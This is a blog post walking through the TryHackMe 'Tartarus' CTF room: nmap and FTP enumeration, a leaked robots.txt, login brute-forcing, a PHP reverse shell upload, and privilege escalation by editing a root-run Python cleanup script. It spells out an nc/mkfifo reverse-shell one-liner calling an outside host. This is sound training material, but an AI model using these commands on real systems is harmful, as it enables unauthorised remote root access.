---
layout: post
title: Tartarus Writeup
date: 2020-08-15 12:00:00 +5:30
categories: [TryHackMe, Medium]
image: /assets/img/tartarus/header.png
tags: [tryhackme, ctf, http, leakedinfo] # add tag
---

## Description:

The Following Post is writeup of Tartarus room of tryhackme <https://tryhackme.com/room/tartarus>

|Machine|Details
|:---|:--
|OS | Linux
|Rating | Easy
|Creator | csenox

## Summary:

  The Room will have a anonymous ftp login upon further enum we will get a file which will redirect us to login page.
  Moving to port 80 we will get robots.txt which contains admin directory where we will get creds and user.
  Brute it to login and got a upload section. Upload a phpshell and will get www-data now you will see a python
  script in user directory put a nc reverse shell and root. :)

## Walkthrough:

### Enumeration

As usual
Lets start with nmap scan
```terminal
└──╼ $nmap -sC -sV 10.10.156.233
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-11 21:54 EDT
Nmap scan report for 10.10.156.233
Host is up (0.22s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp            17 Jul 05 21:45 test.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.9.17.224
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 98:6c:7f:49:db:54:cb:36:6d:d5:ff:75:42:4c:a7:e0 (RSA)
|   256 0c:7b:1a:9c:ed:4b:29:f5:3e:be:1c:9a:e4:4c:07:2c (ECDSA)
|_  256 50:09:9f:c0:67:3e:89:93:b0:c9:85:f1:93:89:50:68 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 58.59 seconds
```

#### FTP

let's dirbust it
```terminal
226 Directory send OK.
ftp> cd ...
250 Directory successfully changed.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 .
drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 ..
drwxr-xr-x    2 ftp      ftp          4096 Jul 05 21:31 ...
226 Directory send OK.
ftp> ls -lah
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 .
drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 ..
drwxr-xr-x    2 ftp      ftp          4096 Jul 05 21:31 ...
226 Directory send OK.
ftp> cd ...
250 Directory successfully changed.
ftp> ls -lah
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Jul 05 21:31 .
drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 ..
-rw-r--r--    1 ftp      ftp            14 Jul 05 21:45 yougotgoodeyes.txt
226 Directory send OK

Never think this way
```
TBH i stuck at this but got it thanks

#### HTTP

we got robots.txt

User-Agent: * <br/>
Disallow : /admin-dir <br />
I told d4rckh we should hide our things deep.

![Page](/assets/img/tartarus/webserver.png)

I got creds and userid <br />
Let's check out what else we can do.

We have admin login let's bruteforce it

![login](/assets/img/tartarus/login.png)

![Bruteforce](/assets/img/tartarus/bruteforce.png)

Got a upload directory after successful login

![Page](/assets/img/tartarus/upload.png)

### Exploitation:

We will start Exploitation by uploading a php reverse Shell<br />
![port 80](/assets/img/tartarus/webshellupload.png)

Execute and get Shell

```terminal
www-data@ubuntu-xenial:/$ ls
bin   dev  home        initrd.img.old  lib64       media  opt   root  sbin  srv  tmp  vagrant  vmlinuz
boot  etc  initrd.img  lib             lost+found  mnt    proc  run   snap  sys  usr  var      vmlinuz.old
www-data@ubuntu-xenial:/$ cd /home
www-data@ubuntu-xenial:/home$ ls
cleanup  d4rckh  thirtytwo
www-data@ubuntu-xenial:/home$ cd d4rckh/
www-data@ubuntu-xenial:/home/d4rckh$ ls
cleanup.py  user.txt
www-data@ubuntu-xenial:/home/d4rckh$ cat user.txt

www-data@ubuntu-xenial:/home/d4rckh$ cat cleanup.py
# -*- coding: utf-8 -*-
#!/usr/bin/env python
import os
import sys
try:
        os.system('rm -r /home/cleanup/* ')
except:
        sys.exit()
```
In place of os system let's put nc reverse Shell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f



Yessss
```terminal
┌─[silver@parrot]─[~/Desktop/tryhackme/tartarus]
└──╼ $pwncat --listen --port 4444
[10:42:02] received connection from 10.10.168.38:35120                                                                  connect.py:149
[10:42:05] new host w/ hash 43d11761713cfc52d9e6fe891bda5715                                                             victim.py:328
[10:42:21] pwncat running in /bin/sh                                                                                     victim.py:362
initializing: complete ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0%
[10:42:30] pwncat is ready 🐈                                                                                            victim.py:758


\[\033[01;31m\](remote)\[\033[00m\] \[\033[01;33m\]\u@\h\[\033[00m\]:\[\033[01;36m\]\w\[\033[00m\]$ bash
root@ubuntu-xenial:~# id
uid=0(root) gid=0(root) groups=0(root)
root@ubuntu-xenial:~#
```
Rooted :-)
